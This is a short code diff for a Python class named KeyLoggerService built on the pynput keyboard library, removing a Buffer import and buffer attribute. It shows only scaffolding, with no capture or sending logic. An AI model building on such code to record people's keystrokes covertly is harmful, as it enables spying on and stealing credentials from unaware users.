@@ -1,11 +1,9 @@
 from pynput import keyboard
 from IKeyLogger import IKeyLogger
-from Buffer import Buffer
 
 
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
-        self.buffer = Buffer()
         self.running = False
         self.listener = None
         self.list_data = []
